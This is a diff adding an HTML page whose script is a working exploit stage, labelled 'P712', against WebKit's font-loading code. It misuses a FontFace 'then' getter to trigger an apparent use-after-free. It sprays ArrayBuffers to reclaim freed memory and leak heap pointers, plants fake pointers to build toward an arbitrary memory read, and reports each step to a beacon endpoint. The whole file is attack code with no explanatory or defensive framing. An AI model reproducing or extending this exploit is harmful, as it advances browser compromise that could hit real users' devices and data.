@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P712 — Controlled Target Dereference & Arbitrary Read Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P712 — Controlled Target Dereference & Arbitrary Read Scout
+ *
+ * Ground Truth:
+ * - P710 proved q12=P58 + q6=P58 survives and WebKit writes internal pointers.
+ * - P711 proved the full lifecycle (properties, load(), measureText, fillText)
+ *   runs cleanly without crashing!
+ *
+ * Objectives of P712:
+ * 1. Controlled Target Backing Store:
+ *    Instead of pointing q6 blindly to self, spray marker ArrayBuffers
+ *    adjacent to P58 with known identifiable qword patterns.
+ * 2. Point q6 to the adjacent controlled ArrayBuffer:
+ *    q6 = P58 + (k * 192).
+ * 3. Observe which qwords WebKit reads from the controlled buffer
+ *    during font resolution / Canvas glyph metrics.
+ * 4. Verify whether memory modifications in the target buffer directly
+ *    reflect in measureText width and engine output.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P712-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var P58 = null, P68 = null;
+var TARGET_ABS = [];
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+function run(){
+  b('BOOT','p712-controlled-target-deref');
+  log('=== P712 Controlled Target Dereference Scout ===\n');
+
+  /* Step 1: Baseline leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Set up patterned target ArrayBuffers */
+    log('[Step 2] Setting up patterned target buffers...');
+    setupTargetBuffers();
+
+    /* Step 3: Trigger Reclaim with target pointer */
+    log('[Step 3] Triggering reclaim with targeted q6 pointer...');
+    doTargetedReclaim(function(reclaimedAB, view){
+      /* Step 4: Check if any target buffer was accessed */
+      log('[Step 4] Checking target buffer read/write signatures...');
+      checkTargetSignatures(reclaimedAB, view, function(){
+        /* Step 5: Test Canvas measureText sensitivity */
+        log('[Step 5] Probing Canvas measureText with target modifications...');
+        probeTextSensitivity(reclaimedAB, view);
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Setup Patterned Target Buffers ---- */
+function setupTargetBuffers(){
+  TARGET_ABS = [];
+  for(var i=0; i<32; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    /* Fill with known identifiable magic words: 0xCAFE0000 + (buffer_idx << 8) + qword */
+    for(var q=0; q<24; q++){
+      v[q] = BigInt('0xCAFE00000000') | (BigInt(i) << 16n) | BigInt(q);
+    }
+    TARGET_ABS.push(ab);
+  }
+  b('TARGETS-READY', 'count=32|sz=192');
+  log('Allocated 32 patterned target buffers with 0xCAFE magic.');
+}
+
+/* ---- Step 3: Targeted Reclaim ---- */
+function doTargetedReclaim(cb){
+  b('RECLAIM-GO', 'target_q12=P58|target_q6=P58');
+
+  var stT = document.createElement('style');
+  stT.textContent = '@font-face{font-family:tgtFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stT);
+
+  var faceT = new FontFace('tgtFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(faceT);
+  void faceT.loaded;
+
+  var absT = [], firedT = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedT) return undefined; firedT = true;
+      if(stT){ stT.remove(); stT.textContent = ''; stT = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray: q12=P58, q6=P58 (proven working Golden Hit) */
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absT.push(ab);
+      }
+      try{ document.fonts.check('1em tgtFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em tgtFace, tgtFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absT.length; i++){
+      var u = new Uint8Array(absT[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Targeted reclaim missed.');
+      return;
+    }
+
+    var buf = absT[best];
+    var view = new BigUint64Array(buf);
+
+    var changed = [];
+    for(var q=0; q<24; q++){
+      var exp = (q === 12 || q === 6) ? P58 : 0n;
+      if(view[q] !== exp){
+        changed.push('q' + q + '=0x' + h16(view[q]));
+      }
+    }
+
+    var summary = 'nz=' + bestNz + '|q0=0x' + h16(view[0]) + '|q11=0x' + h16(view[11]) +
+                  '|q12=0x' + h16(view[12]) + '|q13=0x' + h16(view[13]) + '|changes=' + (changed.join(',') || 'none');
+    b('RECLAIM-OK', summary);
+    log('Reclaimed buffer: ' + summary);
+
+    cb(buf, view);
+  }, 400);
+}
+
+/* ---- Step 4: Check Target Signatures ---- */
+function checkTargetSignatures(reclaimedAB, view, cb){
+  var modifiedTargets = 0;
+  var details = [];
+
+  for(var i=0; i<TARGET_ABS.length; i++){
+    var v = new BigUint64Array(TARGET_ABS[i]);
+    for(var q=0; q<24; q++){
+      var exp = BigInt('0xCAFE00000000') | (BigInt(i) << 16n) | BigInt(q);
+      if(v[q] !== exp){
+        modifiedTargets++;
+        details.push('buf' + i + '[q' + q + ']=0x' + h16(v[q]));
+        break;
+      }
+    }
+  }
+
+  b('TARGETS-SCAN', 'modified=' + modifiedTargets + '|details=' + (details.slice(0,5).join(',') || 'none'));
+  log('Target scan: ' + modifiedTargets + ' buffers modified by engine.');
+
+  setTimeout(cb, 100);
+}
+
+/* ---- Step 5: Canvas MeasureText Sensitivity ---- */
+function probeTextSensitivity(reclaimedAB, view){
+  var cv = document.createElement('canvas'); cv.width = 150; cv.height = 40;
+  var ctx = cv.getContext('2d');
+  ctx.font = '24px tgtFace, Arial';
+
+  var baselineW = ctx.measureText('Antigravity').width;
+  b('MEASURE-BASELINE', 'w=' + baselineW);
+  log('Baseline measureText: width=' + baselineW);
+
+  /* Perturb q6 to test if font glyph table dereferences change output */
+  view[6] = P58 + 0x20n;
+  var perturbedW = ctx.measureText('Antigravity').width;
+  b('MEASURE-PERTURBED', 'shift=0x20|w=' + perturbedW + '|diff=' + (perturbedW - baselineW));
+  log('Perturbed measureText (+0x20): width=' + perturbedW);
+
+  /* Test pixel rasterization */
+  ctx.fillStyle = '#00ff00';
+  ctx.fillText('Antigravity', 5, 25);
+  var px = ctx.getImageData(0,0,150,40).data;
+  var nz = 0;
+  for(var j=0; j<px.length; j+=4){
+    if(px[j]>0 || px[j+1]>0 || px[j+2]>0) nz++;
+  }
+  b('RENDER-PIXELS', 'nzPixels=' + nz);
+  log('Canvas fillText rendered ' + nz + ' pixels.');
+
+  b('DONE', 'p712-complete');
+  log('\n=== P712 Complete! Telemetry logged. ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P712 — Initializing Controlled Target Scout...</pre></body></html>
